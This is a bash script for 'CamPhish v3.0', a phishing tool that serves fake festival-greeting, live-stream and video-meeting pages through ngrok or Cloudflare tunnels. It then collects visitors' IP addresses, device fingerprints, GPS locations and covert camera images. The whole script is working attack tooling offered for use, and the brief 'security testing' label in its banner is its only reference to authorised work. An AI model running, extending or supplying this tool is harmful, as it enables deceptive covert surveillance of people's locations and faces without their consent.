#!/bin/bash
# CamPhish v3.0 - Professional Edition
# Enhanced with Auto-Dashboard & Advanced Fingerprinting

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  windows_mode=true
  echo "Windows system detected. Some commands will be adapted for Windows compatibility."
  
  function killall() {
    taskkill /F /IM "$1" 2>/dev/null
  }
  
  function pkill() {
    if [[ "$1" == "-f" ]]; then
      shift
      shift
      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
    else
      taskkill /F /IM "$1" 2>/dev/null
    fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

banner() {
clear
echo -e "\e[1;92m"
echo "  ╔═══════════════════════════════════════════════════════════╗"
echo "  ║                                                           ║"
echo "  ║   ██████╗ █████╗ ███╗   ███╗██████╗ ██╗  ██╗██╗███████╗  ║"
echo "  ║  ██╔════╝██╔══██╗████╗ ████║██╔══██╗██║  ██║██║██╔════╝  ║"
echo "  ║  ██║     ███████║██╔████╔██║██████╔╝███████║██║███████╗  ║"
echo "  ║  ██║     ██╔══██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║╚════██║  ║"
echo "  ║  ╚██████╗██║  ██║██║ ╚═╝ ██║██║     ██║  ██║██║███████║  ║"
echo "  ║   ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝  ║"
echo "  ║                                                           ║"
echo "  ║              \e[1;93mVersion 3.0 - Professional Edition\e[1;92m             ║"
echo "  ║                                                           ║"
echo "  ╚═══════════════════════════════════════════════════════════╝"
echo -e "\e[0m"
echo -e "\e[1;96m  Advanced Social Engineering Framework for Security Testing\e[0m"
echo ""
echo -e "\e[1;93m  [+] Professional UI/UX Design\e[0m"
echo -e "\e[1;93m  [+] Instant IP Capture with Device Detection\e[0m"
echo -e "\e[1;93m  [+] GPS Location Tracking\e[0m"
echo -e "\e[1;93m  [+] Advanced Device Fingerprinting\e[0m"
echo -e "\e[1;93m  [+] Real-time Dashboard Monitoring\e[0m"
echo -e "\e[1;93m  [+] Invisible Camera Capture\e[0m"
echo ""
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

stop() {
if [[ "$windows_mode" == true ]]; then
  taskkill /F /IM "ngrok.exe" 2>/dev/null
  taskkill /F /IM "php.exe" 2>/dev/null
  taskkill /F /IM "cloudflared.exe" 2>/dev/null
else
  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkcloudflaretunnel=$(ps aux | grep -o "cloudflared" | head -n1)

  if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
  fi

  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi

  if [[ $checkcloudflaretunnel == *'cloudflared'* ]]; then
    pkill -f -2 cloudflared > /dev/null 2>&1
    killall -2 cloudflared > /dev/null 2>&1
  fi
fi

exit 1
}

catch_ip() {
if [[ -e "ip.txt" ]]; then
    # Read the complete IP data
    ip_line=$(grep -a 'IP:' ip.txt | head -n1)
    ua_line=$(grep -a 'User-Agent:' ip.txt | head -n1)
    ts_line=$(grep -a 'Timestamp:' ip.txt | head -n1)
    
    # Extract values
    ip=$(echo "$ip_line" | cut -d " " -f2- | tr -d '\r\n')
    user_agent=$(echo "$ua_line" | cut -d ":" -f2- | tr -d '\r\n' | sed 's/^ *//')
    timestamp=$(echo "$ts_line" | cut -d ":" -f2- | tr -d '\r\n' | sed 's/^ *//')
    
    # Display extracted information
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP Address:\e[0m\e[1;77m %s\e[0m\n" "$ip"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Timestamp:\e[0m\e[1;77m %s\e[0m\n" "$timestamp"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] User Agent:\e[0m\e[1;77m %s\e[0m\n" "$user_agent"
    
    # Save to master log
    cat ip.txt >> saved.ips.txt
fi
}

catch_fingerprint() {
if [[ -e "fingerprints.log" ]]; then
    printf "\n\e[1;95m╔═══════════════════════════════════════════════════════════╗\e[0m\n"
    printf "\e[1;95m║          \e[1;93mDevice Fingerprint Captured!\e[1;95m                  ║\e[0m\n"
    printf "\e[1;95m╚═══════════════════════════════════════════════════════════╝\e[0m\n"
    
    # Display the most recent fingerprint
    tail -n 30 fingerprints.log
    printf "\n"
fi
}

catch_location() {
  if [[ -e "current_location.txt" ]]; then
    printf "\n\e[1;92m╔═══════════════════════════════════════════════════════════╗\e[0m\n"
    printf "\e[1;92m║              \e[1;93mGPS Location Data Received!\e[1;92m                ║\e[0m\n"
    printf "\e[1;92m╚═══════════════════════════════════════════════════════════╝\e[0m\n"
    cat current_location.txt
    printf "\n"
    mv current_location.txt current_location.bak
  fi

  if [[ -e "location_"* ]]; then
    location_file=$(ls -t location_* 2>/dev/null | head -n 1)
    if [[ -n "$location_file" ]]; then
        lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
        lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
        acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
        
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Latitude:\e[0m\e[1;77m %s\e[0m\n" "$lat"
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Longitude:\e[0m\e[1;77m %s\e[0m\n" "$lon"
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Accuracy:\e[0m\e[1;77m %s meters\e[0m\n" "$acc"
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Google Maps:\e[0m\e[1;77m https://www.google.com/maps/search/?api=1&query=%s,%s\e[0m\n" "$lat" "$lon"
        
        if [[ ! -d "saved_locations" ]]; then
            mkdir -p saved_locations
        fi
        
        mv "$location_file" saved_locations/
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Location saved to saved_locations/%s\e[0m\n" "$location_file"
    fi
  fi
  
  [[ -e "LocationLog.log" ]] && rm -rf LocationLog.log
  [[ -e "LocationError.log" ]] && rm -rf LocationError.log
}

catch_capture() {
if [[ -e "Log.log" ]]; then
    printf "\n\e[1;95m╔═══════════════════════════════════════════════════════════╗\e[0m\n"
    printf "\e[1;95m║              \e[1;93mCamera Image Captured!\e[1;95m                     ║\e[0m\n"
    printf "\e[1;95m╚═══════════════════════════════════════════════════════════╝\e[0m\n"
    
    # Find the most recent capture
    newest_cam=$(ls -t captures/cam*.png 2>/dev/null | head -n 1)
    if [[ -n "$newest_cam" ]]; then
        file_size=$(du -h "$newest_cam" | cut -f1)
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Saved to:\e[0m\e[1;77m %s\e[0m\n" "$newest_cam"
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] File size:\e[0m\e[1;77m %s\e[0m\n" "$file_size"
    fi
    
    rm -rf Log.log
fi
}

# Open dashboard in browser
open_dashboard() {
    local port=$1
    local dashboard_url="http://127.0.0.1:${port}/dashboard.html"
    
    printf "\n\e[1;96m╔═══════════════════════════════════════════════════════════╗\e[0m\n"
    printf "\e[1;96m║            \e[1;93mLaunching Real-Time Dashboard\e[1;96m                ║\e[0m\n"
    printf "\e[1;96m╚═══════════════════════════════════════════════════════════╝\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m•\e[0m\e[1;92m] Dashboard URL: \e[0m\e[1;77m%s\e[0m\n" "$dashboard_url"
    
    sleep 2
    
    # Detect OS and open browser
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        if command -v xdg-open > /dev/null; then
            xdg-open "$dashboard_url" > /dev/null 2>&1 &
        elif command -v gnome-open > /dev/null; then
            gnome-open "$dashboard_url" > /dev/null 2>&1 &
        fi
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        open "$dashboard_url" > /dev/null 2>&1 &
    elif [[ "$OSTYPE" == "cygwin" ]] || [[ "$OSTYPE" == "msys" ]] || [[ "$OSTYPE" == "win32" ]]; then
        start "$dashboard_url" > /dev/null 2>&1 &
    fi
    
    printf "\e[1;92m[\e[0m\e[1;77m✓\e[0m\e[1;92m] Dashboard opened in your default browser\e[0m\n"
}

checkfound() {
# Create directories
[[ ! -d "saved_locations" ]] && mkdir -p saved_locations
[[ ! -d "captures" ]] && mkdir -p captures

printf "\n"
printf "\e[1;96m╔═══════════════════════════════════════════════════════════╗\e[0m\n"
printf "\e[1;96m║              \e[1;92mMonitoring System Active\e[1;96m                    ║\e[0m\n"
printf "\e[1;96m╚═══════════════════════════════════════════════════════════╝\e[0m\n"
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m•\e[0m\e[1;92m] Waiting for targets...\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m•\e[0m\e[1;92m] Advanced Fingerprinting: \e[0m\e[1;93mENABLED\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m•\e[0m\e[1;92m] GPS Location Tracking: \e[0m\e[1;93mENABLED\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m•\e[0m\e[1;92m] Camera Capture: \e[0m\e[1;93mENABLED\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m•\e[0m\e[1;92m] Real-time Dashboard: \e[0m\e[1;93mACTIVE\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m•\e[0m\e[1;92m] Press Ctrl+C to exit\e[0m\n"
printf "\n"

while true; do
    # Check for new visitor (IP captured)
    if [[ -e "ip.txt" ]]; then
        printf "\n\e[1;96m╔═══════════════════════════════════════════════════════════╗\e[0m\n"
        printf "\e[1;96m║                  \e[1;92mNew Target Detected!\e[1;96m                     ║\e[0m\n"
        printf "\e[1;96m╚═══════════════════════════════════════════════════════════╝\e[0m\n"
        catch_ip
        rm -rf ip.txt
    fi
    
    sleep 0.5
    
    # Check for fingerprint
    if [[ -e "fingerprints.log" ]]; then
        fingerprint_count=$(grep -c "Device Fingerprint Captured" fingerprints.log 2>/dev/null || echo "0")
        if [[ $fingerprint_count -gt ${last_fingerprint_count:-0} ]]; then
            catch_fingerprint
            last_fingerprint_count=$fingerprint_count
        fi
    fi
    
    # Check for location
    if [[ -e "current_location.txt" ]] || [[ -e "LocationLog.log" ]]; then
        catch_location
    fi
    
    # Check for camera capture
    if [[ -e "Log.log" ]]; then
        catch_capture
    fi
    
    sleep 0.5
done
}

cloudflare_tunnel() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Checking for cloudflared...\n"

if [[ -e cloudflared ]]; then
printf "\e[1;92m[\e[0m+\e[1;92m] cloudflared already installed\n"
else
printf "\e[1;92m[\e[0m+\e[1;92m] Installing cloudflared...\n"

arch=$(uname -m)

if [[ "$windows_mode" == true ]]; then
    if [[ "$arch" == *"x86_64"* ]] || [[ "$arch" == *"AMD64"* ]]; then
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1
    else
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-386.exe -O cloudflared.exe > /dev/null 2>&1
    fi
elif [[ "$(uname)" == "Darwin" ]]; then
    if [[ "$arch" == "arm64" ]]; then
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
    else
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
    fi
    
    tar -xzf cloudflared.tgz > /dev/null 2>&1
    chmod +x cloudflared
    rm -rf cloudflared.tgz
else
    case "$arch" in
        "x86_64")
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
            ;;
        "i686"|"i386")
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
            ;;
        "aarch64"|"arm64")
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
            ;;
        "armv7l"|"armv6l"|"arm")
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
            ;;
        *)
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
            ;;
    esac
    
    chmod +x cloudflared
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on port 3333...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2

# Open dashboard
open_dashboard 3333

printf "\e[1;92m[\e[0m+\e[1;92m] Starting Cloudflare tunnel...\n"

if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel --url 127.0.0.1:3333 > sendlink 2>&1 &
else
    ./cloudflared tunnel --url 127.0.0.1:3333 > sendlink 2>&1 &
fi

sleep 8

link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' sendlink | head -n1)

if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Unable to generate tunnel link\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mCheck your internet connection\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Cloudflare Tunnel Link:\e[0m\e[1;77m %s\e[0m\n" "$link"
fi

payload_cloudflare
checkfound
}

payload_cloudflare() {
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' sendlink | head -n1)
sed 's+forwarding_link+'$link'+g' template.php > index.php

if [[ $option_tem -eq 1 ]]; then
    sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
    sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
    sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
    sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
else
    sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
fi

rm -rf index3.html
}

ngrok_server() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Checking for ngrok...\n"

if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
printf "\e[1;92m[\e[0m+\e[1;92m] ngrok already installed\n"
else
printf "\e[1;92m[\e[0m+\e[1;92m] Installing ngrok...\n"

arch=$(uname -m)

if [[ "$windows_mode" == true ]]; then
    if [[ "$arch" == *"x86_64"* ]] || [[ "$arch" == *"AMD64"* ]]; then
        wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip > /dev/null 2>&1
    else
        wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-386.zip -O ngrok.zip > /dev/null 2>&1
    fi
    
    if [[ -e ngrok.zip ]]; then
        unzip ngrok.zip > /dev/null 2>&1
        rm -rf ngrok.zip
    fi
elif [[ "$(uname)" == "Darwin" ]]; then
    if [[ "$arch" == "arm64" ]]; then
        wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip > /dev/null 2>&1
    else
        wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip > /dev/null 2>&1
    fi
    
    if [[ -e ngrok.zip ]]; then
        unzip ngrok.zip > /dev/null 2>&1
        chmod +x ngrok
        rm -rf ngrok.zip
    fi
else
    case "$arch" in
        "x86_64")
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
            ;;
        "i686"|"i386")
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip -O ngrok.zip > /dev/null 2>&1
            ;;
        "aarch64"|"arm64")
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip > /dev/null 2>&1
            ;;
        "armv7l"|"armv6l"|"arm")
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip -O ngrok.zip > /dev/null 2>&1
            ;;
        *)
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
            ;;
    esac
    
    if [[ -e ngrok.zip ]]; then
        unzip ngrok.zip > /dev/null 2>&1
        chmod +x ngrok
        rm -rf ngrok.zip
    fi
fi
fi

# Ngrok auth token handling
if [[ "$windows_mode" == true ]]; then
    if [[ -e "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok config found\n"
        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
            ./ngrok.exe authtoken $ngrok_auth > /dev/null 2>&1 &
        fi
    else
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
        ./ngrok.exe authtoken $ngrok_auth > /dev/null 2>&1 &
    fi
    
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on port 3333...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
    
    # Open dashboard
    open_dashboard 3333
    
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok tunnel...\n"
    ./ngrok.exe http 3333 > /dev/null 2>&1 &
else
    if [[ -e ~/.ngrok2/ngrok.yml ]]; then
        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok config found\n"
        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
            ./ngrok authtoken $ngrok_auth > /dev/null 2>&1 &
        fi
    else
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
        ./ngrok authtoken $ngrok_auth > /dev/null 2>&1 &
    fi
    
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on port 3333...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
    
    # Open dashboard
    open_dashboard 3333
    
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok tunnel...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
fi

sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app' | head -n1)

if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Unable to generate ngrok link\e[0m\n"
    printf "\e[1;92m[\e[0m*\e[1;92m] Possible reasons:\n"
    printf "\e[1;93m    • Invalid authtoken\n"
    printf "\e[1;93m    • No internet connection\n"
    printf "\e[1;93m    • Ngrok already running (try: killall ngrok)\n"
    exit 1
else
    printf "\e[1;92m[\e[0m*\e[1;92m] Ngrok Tunnel Link:\e[0m\e[1;77m %s\e[0m\n" "$link"
fi

payload_ngrok
checkfound
}

payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app' | head -n1)
sed 's+forwarding_link+'$link'+g' template.php > index.php

if [[ $option_tem -eq 1 ]]; then
    sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
    sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
    sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
    sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
else
    sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
fi

rm -rf index3.html
}

camphish() {
if [[ -e sendlink ]]; then
    rm -rf sendlink
fi

printf "\n\e[1;96m╔═══════════════════════════════════════════════════════════╗\e[0m\n"
printf "\e[1;96m║             \e[1;93mSelect Tunneling Service\e[1;96m                     ║\e[0m\n"
printf "\e[1;96m╚═══════════════════════════════════════════════════════════╝\e[0m\n"
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "     \e[1;37m• Fast and reliable\e[0m\n"
printf "     \e[1;37m• Requires authtoken (free)\e[0m\n"
printf "     \e[1;37m• Recommended for most users\e[0m\n"
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
printf "     \e[1;37m• No registration required\e[0m\n"
printf "     \e[1;37m• Highly secure\e[0m\n"
printf "     \e[1;37m• Good for quick tests\e[0m\n"
printf "\n"

default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"

select_template

if [[ $option_server -eq 2 ]]; then
    cloudflare_tunnel
elif [[ $option_server -eq 1 ]]; then
    ngrok_server
else
    printf "\e[1;93m [!] Invalid option!\e[0m\n"
    sleep 1
    clear
    camphish
fi
}

select_template() {
if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
    printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
    sleep 1
    clear
    banner
    camphish
else
    printf "\n\e[1;96m╔═══════════════════════════════════════════════════════════╗\e[0m\n"
    printf "\e[1;96m║               \e[1;93mSelect Professional Template\e[1;96m                ║\e[0m\n"
    printf "\e[1;96m╚═══════════════════════════════════════════════════════════╝\e[0m\n"
    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
    printf "     \e[1;37m• Modern greeting card design\e[0m\n"
    printf "     \e[1;37m• Perfect for celebrations\e[0m\n"
    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Stream HD\e[0m\n"
    printf "     \e[1;37m• Netflix-style interface\e[0m\n"
    printf "     \e[1;37m• Professional video player\e[0m\n"
    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
    printf "     \e[1;37m• Zoom/Teams-style interface\e[0m\n"
    printf "     \e[1;37m• Realistic meeting layout\e[0m\n"
    printf "\n"
    
    default_option_template="1"
    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
    option_tem="${option_tem:-${default_option_template}}"
    
    if [[ $option_tem -eq 1 ]]; then
        read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name (e.g., Diwali, Christmas, Eid): \e[0m' fest_name
        fest_name="${fest_name//[[:space:]]/}"
    elif [[ $option_tem -eq 2 ]]; then
        read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
    elif [[ $option_tem -eq 3 ]]; then
        printf "\e[1;92m[\e[0m\e[1;77m✓\e[0m\e[1;92m] Online Meeting template selected\e[0m\n"
    else
        printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
        sleep 1
        select_template
    fi
fi
}

# Initialize sessions.json
init_sessions() {
    if [[ ! -e "sessions.json" ]]; then
        echo "{}" > sessions.json
        chmod 666 sessions.json
    fi
}

# Main execution
banner
dependencies
init_sessions
camphish